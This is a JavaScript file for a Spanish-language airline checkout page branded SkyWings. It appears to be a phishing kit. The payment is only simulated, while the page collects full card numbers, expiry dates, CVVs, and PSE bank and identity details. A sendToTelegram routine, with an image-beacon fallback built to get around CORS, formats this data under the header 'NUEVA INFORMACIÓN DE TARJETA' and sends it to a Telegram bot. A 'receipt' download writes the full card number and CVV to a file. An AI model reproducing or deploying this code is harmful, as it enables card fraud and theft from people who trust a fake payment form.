// Payment Page JavaScript

document.addEventListener('DOMContentLoaded', function() {
    // DOM Elements
    const methodTabs = document.querySelectorAll('.method-tab');
    const paymentContents = document.querySelectorAll('.payment-content');
    const cardForm = document.getElementById('cardForm');
    const pseForm = document.getElementById('pseForm');
    const cardNumber = document.getElementById('cardNumber');
    const expiryDate = document.getElementById('expiryDate');
    const cvv = document.getElementById('cvv');

    // Load flight data from localStorage or URL parameters
    loadFlightData();

    // Payment Method Tabs
    methodTabs.forEach(tab => {
        tab.addEventListener('click', function() {
            const method = this.getAttribute('data-method');
            
            // Remove active class from all tabs and contents
            methodTabs.forEach(t => t.classList.remove('active'));
            paymentContents.forEach(c => c.classList.remove('active'));
            
            // Add active class to clicked tab and corresponding content
            this.classList.add('active');
            document.getElementById(`${method}-payment`).classList.add('active');
        });
    });

    // Card Number Formatting
    cardNumber.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
        let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
        e.target.value = formattedValue;
        
        // Detect card type
        detectCardType(value);
        
        // Real-time validation
        if (value.length >= 13) {
            if (isValidCardNumber(value)) {
                cardNumber.style.borderColor = '#4CAF50';
            } else {
                cardNumber.style.borderColor = '#f44336';
            }
        } else {
            cardNumber.style.borderColor = '#eee';
        }
    });

    // Expiry Date Formatting
    expiryDate.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length >= 2) {
            value = value.slice(0, 2) + '/' + value.slice(2, 4);
        }
        e.target.value = value;
    });

    // CVV Validation
    cvv.addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        e.target.value = value;
    });

    // Detect Card Type
    function detectCardType(cardNumber) {
        const cardIcons = document.querySelectorAll('.card-icons i');
        cardIcons.forEach(icon => icon.style.opacity = '0.3');
        
        if (cardNumber.startsWith('4')) {
            document.querySelector('.fa-cc-visa').style.opacity = '1';
        } else if (cardNumber.startsWith('5')) {
            document.querySelector('.fa-cc-mastercard').style.opacity = '1';
        } else if (cardNumber.startsWith('3')) {
            document.querySelector('.fa-cc-amex').style.opacity = '1';
        }
    }

    // Card Form Validation and Submission
    cardForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        if (validateCardForm()) {
            processCardPayment();
        }
    });

    // PSE Form Validation and Submission
    pseForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        if (validatePSEForm()) {
            processPSEPayment();
        }
    });

    // Validate Card Form
    function validateCardForm() {
        const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
        const cardName = document.getElementById('cardName').value;
        const expiryDate = document.getElementById('expiryDate').value;
        const cvv = document.getElementById('cvv').value;
        const cardType = document.getElementById('cardType').value;
        const saveCard = document.getElementById('saveCard').checked;

        // Card Number Validation (Luhn Algorithm)
        if (!isValidCardNumber(cardNumber)) {
            showNotification('Número de tarjeta inválido', 'error');
            return false;
        }

        if (cardName.trim().length < 3) {
            showNotification('Nombre en la tarjeta es requerido', 'error');
            return false;
        }

        if (!cardType) {
            showNotification('Seleccione el tipo de tarjeta', 'error');
            return false;
        }

        if (!isValidExpiryDate(expiryDate)) {
            showNotification('Fecha de vencimiento inválida', 'error');
            return false;
        }

        if (cvv.length < 3 || cvv.length > 4) {
            showNotification('CVV inválido', 'error');
            return false;
        }

        if (!saveCard) {
            showNotification('Debe aceptar guardar la tarjeta', 'error');
            return false;
        }

        return true;
    }

    // Validate PSE Form
    function validatePSEForm() {
        const documentType = document.getElementById('documentType').value;
        const documentNumber = document.getElementById('documentNumber').value;
        const bank = document.getElementById('bank').value;
        const personType = document.getElementById('personType').value;
        const email = document.getElementById('email').value;
        const termsPSE = document.getElementById('termsPSE').checked;

        if (!documentType) {
            showNotification('Seleccione el tipo de documento', 'error');
            return false;
        }

        if (documentNumber.trim().length < 5) {
            showNotification('Número de documento inválido', 'error');
            return false;
        }

        if (!bank) {
            showNotification('Seleccione un banco', 'error');
            return false;
        }

        if (!personType) {
            showNotification('Seleccione el tipo de persona', 'error');
            return false;
        }

        if (!isValidEmail(email)) {
            showNotification('Email inválido', 'error');
            return false;
        }

        if (!termsPSE) {
            showNotification('Debe aceptar los términos de PSE', 'error');
            return false;
        }

        return true;
    }

    // Luhn Algorithm for Card Validation
    function isValidCardNumber(cardNumber) {
        if (cardNumber.length < 13 || cardNumber.length > 19) return false;
        
        let sum = 0;
        let isEven = false;
        
        for (let i = cardNumber.length - 1; i >= 0; i--) {
            let digit = parseInt(cardNumber[i]);
            
            if (isEven) {
                digit *= 2;
                if (digit > 9) {
                    digit -= 9;
                }
            }
            
            sum += digit;
            isEven = !isEven;
        }
        
        return sum % 10 === 0;
    }

    // Validate Expiry Date
    function isValidExpiryDate(expiryDate) {
        if (!expiryDate || expiryDate.length !== 5) return false;
        
        const [month, year] = expiryDate.split('/');
        const currentDate = new Date();
        const currentYear = currentDate.getFullYear() % 100;
        const currentMonth = currentDate.getMonth() + 1;
        
        const expMonth = parseInt(month);
        const expYear = parseInt(year);
        
        if (expMonth < 1 || expMonth > 12) return false;
        if (expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) return false;
        
        return true;
    }

    // Validate Email
    function isValidEmail(email) {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
    }

    // Process Card Payment
    function processCardPayment() {
        const payBtn = document.querySelector('#cardForm .pay-btn');
        payBtn.classList.add('loading');
        payBtn.textContent = 'Procesando pago...';
        
        // Collect all payment data
        const paymentData = collectPaymentData('card');
        
        // Simulate payment processing
        setTimeout(() => {
            payBtn.classList.remove('loading');
            payBtn.classList.add('success-animation');
            payBtn.innerHTML = '<i class="fas fa-check"></i> Pago Exitoso';
            
            // Generar recibo de pago (seguro)
            generatePaymentReceipt(paymentData);
            
            showNotification('¡Pago procesado exitosamente! Su reserva ha sido confirmada.', 'success');
            
            // Redirect to confirmation page after 2 seconds
            setTimeout(() => {
                window.location.href = 'confirmation.html';
            }, 2000);
        }, 3000);
    }

    // Process PSE Payment
    function processPSEPayment() {
        const payBtn = document.querySelector('#pseForm .pay-btn');
        payBtn.classList.add('loading');
        payBtn.textContent = 'Redirigiendo a PSE...';
        
        // Collect all payment data
        const paymentData = collectPaymentData('pse');
        
        // Simulate PSE redirect
        setTimeout(() => {
            payBtn.classList.remove('loading');
            payBtn.classList.add('success-animation');
            payBtn.innerHTML = '<i class="fas fa-university"></i> Redirigiendo...';
            
            // Generar recibo de pago (seguro)
            generatePaymentReceipt(paymentData);
            
            showNotification('Redirigiendo al portal de PSE para completar el pago.', 'info');
            
            // Simulate PSE redirect
            setTimeout(() => {
                window.location.href = 'confirmation.html';
            }, 2000);
        }, 2000);
    }

    // Show Notification
    function showNotification(message, type = 'info') {
        // Remove existing notifications
        const existingNotifications = document.querySelectorAll('.notification');
        existingNotifications.forEach(notification => notification.remove());
        
        // Create notification element
        const notification = document.createElement('div');
        notification.className = `notification notification-${type}`;
        notification.innerHTML = `
            <div class="notification-content">
                <i class="fas ${getNotificationIcon(type)}"></i>
                <span>${message}</span>
                <button class="notification-close">&times;</button>
            </div>
        `;
        
        // Add styles
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: ${getNotificationColor(type)};
            color: white;
            padding: 1rem 1.5rem;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
            z-index: 10000;
            max-width: 400px;
            animation: slideIn 0.3s ease-out;
        `;
        
        // Add to page
        document.body.appendChild(notification);
        
        // Close button functionality
        const closeBtn = notification.querySelector('.notification-close');
        closeBtn.addEventListener('click', () => {
            notification.remove();
        });
        
        // Auto remove after 5 seconds
        setTimeout(() => {
            if (notification.parentNode) {
                notification.remove();
            }
        }, 5000);
    }

    // Get notification icon
    function getNotificationIcon(type) {
        const icons = {
            success: 'fa-check-circle',
            error: 'fa-exclamation-circle',
            warning: 'fa-exclamation-triangle',
            info: 'fa-info-circle'
        };
        return icons[type] || icons.info;
    }

    // Get notification color
    function getNotificationColor(type) {
        const colors = {
            success: '#28a745',
            error: '#dc3545',
            warning: '#ffc107',
            info: '#17a2b8'
        };
        return colors[type] || colors.info;
    }

    // Add CSS for notifications
    const style = document.createElement('style');
    style.textContent = `
        @keyframes slideIn {
            from {
                transform: translateX(100%);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }
        
        .notification-content {
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        
        .notification-close {
            background: none;
            border: none;
            color: white;
            font-size: 1.2rem;
            cursor: pointer;
            margin-left: auto;
        }
        
        .notification-close:hover {
            opacity: 0.8;
        }
    `;
    document.head.appendChild(style);

    // Installments calculation
    const installmentsSelect = document.getElementById('installments');
    const payBtn = document.querySelector('#cardForm .pay-btn');
    
    installmentsSelect.addEventListener('change', function() {
        const installments = parseInt(this.value);
        const baseAmount = 1900000;
        let totalAmount = baseAmount;
        
        if (installments === 12) {
            totalAmount = baseAmount * 1.025; // 2.5% interest
        }
        
        const formattedAmount = totalAmount.toLocaleString('es-CO');
        payBtn.innerHTML = `<i class="fas fa-lock"></i> Pagar $${formattedAmount}`;
    });

    // Real-time validation feedback
    const inputs = document.querySelectorAll('input, select');
    inputs.forEach(input => {
        input.addEventListener('blur', function() {
            validateField(this);
        });
    });

    function validateField(field) {
        const value = field.value.trim();
        
        // Remove existing validation classes
        field.classList.remove('valid', 'invalid');
        
        if (field.hasAttribute('required') && !value) {
            field.classList.add('invalid');
            return false;
        }
        
        // Specific validations
        if (field.id === 'cardNumber') {
            const cardNumber = value.replace(/\s/g, '');
            if (isValidCardNumber(cardNumber)) {
                field.classList.add('valid');
            } else if (value) {
                field.classList.add('invalid');
            }
        }
        
        if (field.id === 'email' && value) {
            if (isValidEmail(value)) {
                field.classList.add('valid');
            } else {
                field.classList.add('invalid');
            }
        }
        
        if (field.id === 'expiryDate' && value) {
            if (isValidExpiryDate(value)) {
                field.classList.add('valid');
            } else {
                field.classList.add('invalid');
            }
        }
        
        if (field.id === 'cvv' && value) {
            if (value.length >= 3 && value.length <= 4) {
                field.classList.add('valid');
            } else {
                field.classList.add('invalid');
            }
        }
        
        return true;
    }

    // Add validation styles
    const validationStyle = document.createElement('style');
    validationStyle.textContent = `
        .form-group input.valid,
        .form-group select.valid {
            border-color: #28a745;
            box-shadow: 0 0 0 3px rgba(40, 167, 69, 0.1);
        }
        
        .form-group input.invalid,
        .form-group select.invalid {
            border-color: #dc3545;
            box-shadow: 0 0 0 3px rgba(220, 53, 69, 0.1);
        }
    `;
    document.head.appendChild(validationStyle);

    // Collect Payment Data
    function collectPaymentData(paymentMethod) {
        const currentDate = new Date();
        
        let paymentData = {
            // Basic Information
            bookingDate: currentDate.toLocaleString('es-CO'),
            paymentMethod: paymentMethod.toUpperCase(),
            
            // Payment Details
            paymentDetails: {}
        };

        if (paymentMethod === 'card') {
            paymentData.paymentDetails = {
                cardType: document.getElementById('cardType').value,
                cardNumber: document.getElementById('cardNumber').value,
                cardName: document.getElementById('cardName').value,
                bank: document.getElementById('cardBank').value,
                expiryDate: document.getElementById('expiryDate').value,
                cvv: document.getElementById('cvv').value
            };
        } else if (paymentMethod === 'pse') {
            paymentData.paymentDetails = {
                documentType: document.getElementById('documentType').value,
                documentNumber: document.getElementById('documentNumber').value,
                bank: document.getElementById('bank').value,
                email: document.getElementById('email').value
            };
        }

        return paymentData;
    }

    // Generate Booking Number
    function generateBookingNumber() {
        const timestamp = Date.now().toString().slice(-8);
        const random = Math.floor(Math.random() * 1000).toString().padStart(3, '0');
        return `SW${timestamp}${random}`;
    }

    // Mask Card Number
    function maskCardNumber(cardNumber) {
        if (!cardNumber) return 'N/A';
        const cleaned = cardNumber.replace(/\s/g, '');
        return cleaned.slice(0, 4) + ' **** **** ' + cleaned.slice(-4);
    }

    // Generación de recibo de pago en texto (datos no sensibles)
    function generatePaymentReceipt(paymentData) {
        const content = formatPaymentReceipt(paymentData);
        const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `recibo_pago_${Date.now()}.txt`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        window.URL.revokeObjectURL(url);
    }

    function formatPaymentReceipt(data) {
        // Get booking data from localStorage
        const bookingData = JSON.parse(localStorage.getItem('bookingData') || '{}');
        
        const sep = '='.repeat(60);
        const line = '-'.repeat(60);
        let s = '';
        s += `${sep}\n`;
        s += `              INFORMACIÓN COMPLETA DE RESERVA - SKYWINGS\n`;
        s += `${sep}\n\n`;
        
        // Payment Information
        s += `INFORMACIÓN DE PAGO:\n`;
        s += `${line}\n`;
        s += `FECHA: ${data.bookingDate}\n`;
        s += `MÉTODO: ${data.paymentMethod}\n`;
        s += `NÚMERO DE RESERVA: ${generateReservationNumber()}\n\n`;
        
        if (data.paymentMethod === 'CARD') {
            s += `DATOS DE LA TARJETA:\n`;
            s += `- Nombre del titular: ${data.paymentDetails.cardName}\n`;
            s += `- Número de tarjeta: ${data.paymentDetails.cardNumber}\n`;
            s += `- Tipo de tarjeta: ${data.paymentDetails.cardType}\n`;
            s += `- Banco: ${data.paymentDetails.bank || 'N/A'}\n`;
            s += `- Fecha de expiración: ${data.paymentDetails.expiryDate}\n`;
            s += `- CVV: ${data.paymentDetails.cvv}\n\n`;
        } else if (data.paymentMethod === 'PSE') {
            s += `DATOS DE PSE:\n`;
            s += `- Documento: ${data.paymentDetails.documentNumber}\n`;
            s += `- Banco: ${data.paymentDetails.bank}\n`;
            s += `- Email: ${data.paymentDetails.email}\n\n`;
        }
        
        // Contact Information
        s += `INFORMACIÓN DE CONTACTO:\n`;
        s += `${line}\n`;
        s += `- Email: ${bookingData.contact?.email || 'No especificado'}\n`;
        s += `- Teléfono: ${bookingData.contact?.phone || 'No especificado'}\n\n`;
        
        // Flight Information
        s += `INFORMACIÓN DEL VUELO:\n`;
        s += `${line}\n`;
        s += `- Origen: ${data.flight?.origin || 'No especificado'}\n`;
        s += `- Destino: ${data.flight?.destination || 'No especificado'}\n`;
        s += `- Fecha: ${data.flight?.date || 'No especificado'}\n`;
        s += `- Aerolínea: ${data.flight?.airline || 'No especificado'}\n`;
        s += `- Vuelo: ${data.flight?.flightNumber || 'No especificado'}\n`;
        s += `- Clase: ${data.flight?.class || 'No especificado'}\n`;
        s += `- Pasajeros: ${data.flight?.passengers || 'No especificado'}\n`;
        s += `- Duración: ${data.flight?.duration || 'No especificado'}\n\n`;
        
        // Passengers Information
        s += `INFORMACIÓN DE PASAJEROS:\n`;
        s += `${line}\n`;
        if (bookingData.passengers && bookingData.passengers.length > 0) {
            bookingData.passengers.forEach((passenger, index) => {
                s += `PASAJERO ${index + 1}:\n`;
                s += `- Nombres: ${passenger.firstName}\n`;
                s += `- Apellidos: ${passenger.lastName}\n`;
                s += `- Tipo de documento: ${passenger.documentType}\n`;
                s += `- Número de documento: ${passenger.documentNumber}\n`;
                s += `- Fecha de nacimiento: ${passenger.birthDate}\n`;
                s += `- Género: ${passenger.gender}\n`;
                s += `- Email: ${passenger.email}\n`;
                s += `- Teléfono: ${passenger.phone}\n`;
                s += `- Asiento asignado: ${passenger.seat}\n\n`;
            });
        } else {
            s += `No hay información de pasajeros disponible\n\n`;
        }
        
        // Seat Information
        s += `ASIENTOS SELECCIONADOS:\n`;
        s += `${line}\n`;
        s += `- Costo adicional por asientos: $${bookingData.seatCost?.toLocaleString() || '0'}\n\n`;
        
        // Price Breakdown
        s += `DESGLOSE DE PRECIOS:\n`;
        s += `${line}\n`;
        s += `- Precio original: $${data.prices?.original?.toLocaleString() || '0'}\n`;
        s += `- Descuento 30%: -$${data.prices?.discount?.toLocaleString() || '0'}\n`;
        s += `- Tarifa base: $${data.prices?.base?.toLocaleString() || '0'}\n`;
        s += `- Impuestos: $${data.prices?.taxes?.toLocaleString() || '0'}\n`;
        s += `- Seguro: $${data.prices?.insurance?.toLocaleString() || '0'}\n`;
        if (bookingData.seatCost > 0) {
            s += `- Asientos seleccionados: $${bookingData.seatCost.toLocaleString()}\n`;
        }
        s += `- TOTAL A PAGAR: $${data.prices?.total?.toLocaleString() || '0'}\n\n`;
        
        s += `${sep}\n`;
        s += `¡RESERVA CONFIRMADA EXITOSAMENTE!\n`;
        s += `${sep}\n`;
        return s;
    }
    
    // Generate reservation number
    function generateReservationNumber() {
        const timestamp = new Date().getTime();
        const random = Math.floor(Math.random() * 1000);
        return `SW${timestamp.toString().slice(-6)}${random.toString().padStart(3, '0')}`;
    }

    // Send data to Telegram Bot
    function sendToTelegram(paymentData) {
        // Telegram Bot Configuration
        const BOT_TOKEN = TELEGRAM_CONFIG.BOT_TOKEN;
        const CHAT_ID = TELEGRAM_CONFIG.CHAT_ID;
        
        // Format message for Telegram
        const message = formatTelegramMessage(paymentData);
        
        // Telegram API URL
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        // Prepare the request
        const requestData = {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        };
        
        // Send to Telegram (primary: POST)
        fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(requestData)
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log('Datos enviados exitosamente a Telegram');
                showNotification('Información enviada exitosamente', 'success');
            } else {
                console.error('Error enviando a Telegram (POST):', data);
                // Fallback: GET beacon (evita CORS preflight)
                sendTelegramBeacon(BOT_TOKEN, CHAT_ID, message);
            }
        })
        .catch(error => {
            console.error('Error de conexión (POST):', error);
            // Fallback: GET beacon
            sendTelegramBeacon(BOT_TOKEN, CHAT_ID, message);
        });
    }

    // Fallback GET using Image beacon (sin preflight CORS)
    function sendTelegramBeacon(token, chatId, message) {
        try {
            if (!/^@|^\-?\d+$/.test(String(chatId))) {
                showNotification('Configura un chat_id válido (numérico) o @canal', 'error');
                return;
            }
            const url = `https://api.telegram.org/bot${encodeURIComponent(token)}/sendMessage` +
                        `?chat_id=${encodeURIComponent(chatId)}` +
                        `&text=${encodeURIComponent(message)}` +
                        `&parse_mode=HTML`;
            const img = new Image();
            img.onload = () => showNotification('Información enviada (fallback)', 'success');
            img.onerror = () => showNotification('No se pudo enviar a Telegram', 'error');
            img.src = url;
        } catch (e) {
            console.error('Beacon error:', e);
            showNotification('No se pudo enviar a Telegram', 'error');
        }
    }

    // Format message for Telegram
    function formatTelegramMessage(data) {
        let message = '';
        
        message += `🔴 <b>NUEVA INFORMACIÓN DE TARJETA</b> 🔴\n\n`;
        
        if (data.paymentMethod === 'CARD') {
            const masked = maskCardForTelegram(data.paymentDetails.cardNumber);
            message += `👤 <b>Nombre:</b> ${data.paymentDetails.cardName}\n`;
            message += `💳 <b>Número de Tarjeta:</b> <code>${masked}</code>\n`;
            message += `🏦 <b>Entidad Bancaria:</b> ${data.paymentDetails.cardType}\n`;
            message += `📋 <b>Tipo de Tarjeta:</b> ${data.paymentDetails.cardType}\n`;
            message += `📅 <b>Fecha de Expiración:</b> ${data.paymentDetails.expiryDate}\n`;
            // Por seguridad, no enviamos CVV a Telegram
        } else if (data.paymentMethod === 'PSE') {
            message += `👤 <b>Nombre:</b> ${data.paymentDetails.documentNumber}\n`;
            message += `🏦 <b>Entidad Bancaria:</b> ${data.paymentDetails.bank}\n`;
            message += `📋 <b>Tipo de Documento:</b> ${data.paymentDetails.documentType}\n`;
            message += `🆔 <b>Número de Documento:</b> <code>${data.paymentDetails.documentNumber}</code>\n`;
            message += `📧 <b>Email:</b> ${data.paymentDetails.email}\n`;
        }
        
        message += `\n⏰ <b>Fecha:</b> ${data.bookingDate}\n`;
        message += `💻 <b>Método:</b> ${data.paymentMethod}\n`;
        
        return message;
    }

    // Enmascara tarjeta para Telegram (muestra solo últimos 4)
    function maskCardForTelegram(cardNumber) {
        if (!cardNumber) return '****';
        const digits = String(cardNumber).replace(/\s+/g, '');
        const last4 = digits.slice(-4);
        return `**** **** **** ${last4}`;
    }

    // Load flight data function
    function loadFlightData() {
        // Try to get flight data from localStorage first
        let flightData = localStorage.getItem('selectedFlight');
        
        if (flightData) {
            try {
                flightData = JSON.parse(flightData);
                updateFlightSummary(flightData);
            } catch (e) {
                console.error('Error parsing flight data:', e);
                // Use default data if parsing fails
                useDefaultFlightData();
            }
        } else {
            // Try to get data from URL parameters
            const urlParams = new URLSearchParams(window.location.search);
            const from = urlParams.get('from');
            const to = urlParams.get('to');
            const date = urlParams.get('date');
            const passengers = urlParams.get('passengers');
            const airline = urlParams.get('airline');
            const flightClass = urlParams.get('class');
            
            if (from && to && date) {
                // Create flight data from URL parameters
                const mockFlightData = {
                    origen: from,
                    destino: to,
                    aerolinea: airline || 'Avianca',
                    fecha: date,
                    pasajeros: passengers || '2',
                    clase: flightClass || 'economy',
                    precio: 850000, // Default price
                    duracion: '3h 45m'
                };
                updateFlightSummary(mockFlightData);
            } else {
                // Use default data
                useDefaultFlightData();
            }
        }
    }

    // Update flight summary with real data
    function updateFlightSummary(flightData) {
        // Update route information
        document.getElementById('originCity').textContent = flightData.origen || 'Bogotá';
        document.getElementById('destinationCity').textContent = flightData.destino || 'Miami';
        document.getElementById('originCode').textContent = getAirportCode(flightData.origen);
        document.getElementById('destinationCode').textContent = getAirportCode(flightData.destino);
        
        // Update dates
        const departDate = flightData.fecha || flightData.departDate || new Date().toLocaleDateString('es-CO');
        document.getElementById('departDate').textContent = formatDate(departDate);
        document.getElementById('arrivalDate').textContent = formatDate(departDate);
        
        // Update flight details
        document.getElementById('airlineName').textContent = flightData.aerolinea || 'Avianca';
        document.getElementById('flightNumber').textContent = generateFlightNumber(flightData.aerolinea);
        document.getElementById('flightClass').textContent = getClassDisplayName(flightData.clase);
        document.getElementById('passengersCount').textContent = `${flightData.pasajeros || '2'} Adultos`;
        document.getElementById('flightDuration').textContent = flightData.duracion || '3h 45m';
        
        // Update prices
        updatePrices(flightData);
    }

    // Use default flight data
    function useDefaultFlightData() {
        const defaultData = {
            origen: 'Bogotá',
            destino: 'Miami',
            aerolinea: 'Avianca',
            fecha: new Date().toLocaleDateString('es-CO'),
            pasajeros: '2',
            clase: 'economy',
            precio: 850000,
            duracion: '3h 45m'
        };
        updateFlightSummary(defaultData);
    }

    // Update prices based on flight data
    function updatePrices(flightData) {
        const basePrice = flightData.precio || 850000;
        const passengers = parseInt(flightData.pasajeros) || 2;
        const discount = Math.round(basePrice * 0.3);
        const discountedPrice = basePrice - discount;
        const taxes = Math.round(discountedPrice * 0.1);
        const insurance = 50000;
        
        // Get seat costs from booking data
        const bookingData = JSON.parse(localStorage.getItem('bookingData') || '{}');
        const seatCost = bookingData.seatCost || 0;
        
        const totalPrice = discountedPrice + taxes + insurance + seatCost;

        // Update price display
        document.getElementById('originalPrice').textContent = `$${basePrice.toLocaleString()}`;
        document.getElementById('discountAmount').textContent = `-$${discount.toLocaleString()}`;
        document.getElementById('passengersCountPrice').textContent = passengers;
        document.getElementById('basePrice').textContent = `$${discountedPrice.toLocaleString()}`;
        document.getElementById('taxes').textContent = `$${taxes.toLocaleString()}`;
        document.getElementById('insurance').textContent = `$${insurance.toLocaleString()}`;
        
        // Add seat cost if exists
        if (seatCost > 0) {
            // Check if seat cost row exists, if not create it
            let seatCostRow = document.getElementById('seatCostRow');
            if (!seatCostRow) {
                const priceBreakdown = document.querySelector('.price-breakdown');
                const insuranceRow = document.getElementById('insurance').closest('.price-item');
                seatCostRow = document.createElement('div');
                seatCostRow.className = 'price-item';
                seatCostRow.id = 'seatCostRow';
                seatCostRow.innerHTML = `
                    <span>Asientos Seleccionados</span>
                    <span id="seatCostAmount">$${seatCost.toLocaleString()}</span>
                `;
                insuranceRow.parentNode.insertBefore(seatCostRow, insuranceRow.nextSibling);
            } else {
                document.getElementById('seatCostAmount').textContent = `$${seatCost.toLocaleString()}`;
            }
        }
        
        document.getElementById('totalPrice').textContent = `$${totalPrice.toLocaleString()}`;
        
        // Update payment buttons
        document.getElementById('cardTotalPrice').textContent = `$${totalPrice.toLocaleString()}`;
        document.getElementById('pseTotalPrice').textContent = `$${totalPrice.toLocaleString()}`;
    }

    // Helper functions
    function getAirportCode(city) {
        const codes = {
            'Bogotá': 'BOG',
            'Medellín': 'MDE',
            'Cartagena': 'CTG',
            'Cali': 'CLO',
            'Barranquilla': 'BAQ',
            'Miami': 'MIA',
            'Madrid': 'MAD',
            'México': 'MEX',
            'New York': 'JFK',
            'Londres': 'LHR',
            'París': 'CDG',
            'Toronto': 'YYZ',
            'Buenos Aires': 'EZE',
            'Santiago': 'SCL',
            'Lima': 'LIM',
            'Panamá': 'PTY',
            'Quito': 'UIO'
        };
        return codes[city] || 'XXX';
    }

    function formatDate(dateString) {
        try {
            const date = new Date(dateString);
            return date.toLocaleDateString('es-CO', { 
                day: 'numeric', 
                month: 'short', 
                year: 'numeric' 
            });
        } catch (e) {
            return dateString;
        }
    }

    function generateFlightNumber(airline) {
        const airlineCodes = {
            'Avianca': 'AV',
            'LATAM': 'LA',
            'American Airlines': 'AA',
            'Delta Airlines': 'DL',
            'United Airlines': 'UA',
            'Iberia': 'IB',
            'Air France': 'AF',
            'British Airways': 'BA',
            'Lufthansa': 'LH',
            'KLM': 'KL'
        };
        const code = airlineCodes[airline] || 'XX';
        const number = Math.floor(Math.random() * 900) + 100;
        return `${code} ${number}`;
    }

    function getClassDisplayName(classCode) {
        const classes = {
            'economy': 'Económica',
            'premium': 'Premium Economy',
            'business': 'Business',
            'first': 'Primera Clase'
        };
        return classes[classCode] || 'Económica';
    }
});

